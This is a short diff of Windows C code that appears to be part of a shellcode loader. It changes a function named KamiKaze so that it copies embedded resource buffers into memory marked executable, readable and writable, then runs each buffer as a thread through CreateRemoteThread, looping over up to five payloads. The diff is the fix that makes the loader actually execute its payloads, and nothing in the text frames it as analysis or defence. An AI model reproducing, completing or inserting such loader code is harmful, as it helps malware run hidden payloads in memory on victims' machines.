@@ -224,9 +224,10 @@ HGLOBAL LoadExbff(int i, LPCSTR lpName)
     return ExBuffer;
 }
 
-void KamiKaze(DWORD size)
+void KamiKaze(DWORD size,void *src)
 {
     void* buff = VirtualAlloc(0, (SIZE_T)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    memcpy_s(buff,size,src,size);
     CreateRemoteThread(GetCurrentProcess(), NULL, size, (LPTHREAD_START_ROUTINE)buff, NULL, NULL, NULL);
     return;
 
@@ -267,7 +268,7 @@ DWORD wf8kmain(unsigned int ags)
         while (i < 5)
         {
             if (Size[i])
-                KamiKaze(Size[i]);
+                KamiKaze(Size[i],ExecBuffer[i]);
             i++;
         }
     }
